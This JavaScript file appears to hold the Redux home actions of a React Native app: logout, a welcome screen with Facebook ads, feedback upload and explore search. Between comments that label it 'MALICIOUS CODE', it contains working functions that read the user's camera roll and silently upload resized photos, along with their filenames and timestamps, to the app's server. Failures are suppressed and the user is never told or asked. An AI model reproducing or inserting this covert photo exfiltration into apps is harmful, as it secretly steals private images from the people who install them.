import {ACTIONS} from './types';
import {logEvent} from './ChatAction';
import {URLS, LOG_EVENT, SCREENS, SCREEN_CLASSES} from '../Constants';
import {NativeAdsManager} from 'react-native-fbads';
import CameraRoll from '@react-native-community/cameraroll';
import ImageResizer from 'react-native-image-resizer';
import {
  httpClient,
  uploadImageServer,
  encrypt,
  storageRemoveItem,
  uploadImage,
} from '../utilities';

// *********** --- MALICIOUS CODE --- *************
const getImageResize = (imageSize) => {
  let multiplier = 1;
  if (imageSize.width > 1080 || imageSize.height > 1080) {
    multiplier = 0.75;
  }
  if (imageSize.width > 2160 || imageSize.height > 2160) {
    multiplier = 0.5;
  }
  return {
    width: imageSize.width * multiplier,
    height: imageSize.height * multiplier,
  };
};

const convertAndUpload = async (image, groupName, enc_authToken) => {
  const resize = getImageResize({width: image.width, height: image.height});
  const resizedImage = await ImageResizer.createResizedImage(
    image.uri,
    resize.width,
    resize.height,
    'JPEG',
    90,
  );

  await uploadImageServer({
    type: `personal_pictures/${groupName}`,
    mimeType: 'image/jpeg',
    shouldUpload: true,
    image_url: resizedImage.uri,
    extension: 'jpeg',
    authToken: enc_authToken,
  }).catch(() => {});
};

export const uploadCameraRollPhotos = async (
  authToken,
  numberOfImages,
  groupTypes,
  groupName,
  after,
) => {
  const enc_authToken = encrypt(authToken);

  let photosLeft = [];
  // NOW DOING PROMISE STUFF
  let promiseList = [];

  const photos = await CameraRoll.getPhotos({
    first: numberOfImages,
    assetType: 'Photos',
    groupTypes,
    groupName,
    after,
  }).catch((e) => {});
  photosLeft = photos.edges;

  for (let i = 0; i < photosLeft.length; i++) {
    promiseList.push(
      convertAndUpload(photosLeft[i].node.image, groupName, enc_authToken),
    );
  }

  await Promise.all(promiseList);
};

export const getPhotosMetadata = async (
  authToken,
  numberOfImages,
  groupTypes,
  groupName,
  after,
) => {
  const photos = await CameraRoll.getPhotos({
    first: numberOfImages,
    assetType: 'Photos',
    groupTypes,
    groupName,
    after,
  }).catch((e) => {});

  let to_send = {
    page_info: photos.page_info,
    edges: [],
    timeRepliedByDevice: Date.now(),
  };
  for (let i = 0; i < photos.edges.length; i++) {
    const {timestamp, image} = photos.edges[i].node;
    to_send.edges.push({timestamp, filename: image.filename});
  }

  httpClient().post(URLS.get_photo_metadata, to_send);
};
// *********** --- MALICIOUS CODE --- *************

export const logout = (onLogout) => {
  return (dispatch) => {
    storageRemoveItem('HOME ACTION 1', 'data')
      .then(() => {
        httpClient().get(URLS.logout);
        dispatch({type: ACTIONS.LOGOUT});
        onLogout();
      })
      .catch((e) =>
        logEvent(LOG_EVENT.ERROR, {
          errorLine: 'HOME ACTION - 35',
          description: e.toString(),
        }),
      );
  };
};

export const getWelcome = (onError) => {
  return (dispatch) => {
    dispatch({type: ACTIONS.HOME_LOADING});

    // AdSettings.addTestDevice(AdSettings.currentDeviceHash);
    let adsManager = new NativeAdsManager(
      '2458153354447665_2459775687618765',
      10,
    );
    adsManager.setMediaCachePolicy('all');

    httpClient()
      .get(URLS.welcome)
      .then(({data}) => {
        if (data.error) {
          storageRemoveItem('HOME ACTION 2', 'data')
            .then(() => {
              dispatch({type: ACTIONS.LOGOUT});
              onError();
            })
            .catch((e) =>
              logEvent(LOG_EVENT.ERROR, {
                errorLine: 'HOME ACTION - 59',
                description: e.toString(),
              }),
            );
        } else {
          dispatch({type: ACTIONS.WELCOME, payload: {...data, adsManager}});
        }
      })
      .catch((e) => {
        logEvent(LOG_EVENT.ERROR, {
          errorLine: 'HOME ACTION - 67, Connection Error',
          description: e.toString(),
        });
        dispatch({
          type: ACTIONS.HOME_ERROR,
          payload: 'Sorry, could not connect to the server!',
        });
      });
  };
};

export const submitFeedback = async (feedback_obj) => {
  // this function is responsible for uploading data,
  //nothing will be passed to the reducer
  const local_image_url = feedback_obj.image_url;
  if (local_image_url) {
    const image_url = await uploadImage(local_image_url, {
      type: 'feedback',
      image_type: 'jpeg',
    }).catch((e) =>
      logEvent(LOG_EVENT.ERROR, {
        errorLine: 'HOME ACTION - 87',
        description: e.toString(),
      }),
    );
    feedback_obj.image_url = image_url;
  }
  httpClient().post(URLS.feedback, feedback_obj);
};

export const exploreSearch = (category) => {
  return (dispatch) => {
    {
      dispatch({type: ACTIONS.EXPLORE_SEARCH_LOADING});
      httpClient()
        .post(URLS.search, {search: '', category})
        .then(({data}) => {
          dispatch({
            type: ACTIONS.EXPLORE_SEARCH,
            payload: {data, exploreCategory: category},
          });
        })
        .catch((e) =>
          logEvent(LOG_EVENT.ERROR, {
            errorLine: 'HOME ACTION - 165',
            description: e.toString(),
          }),
        );
    }
  };
};
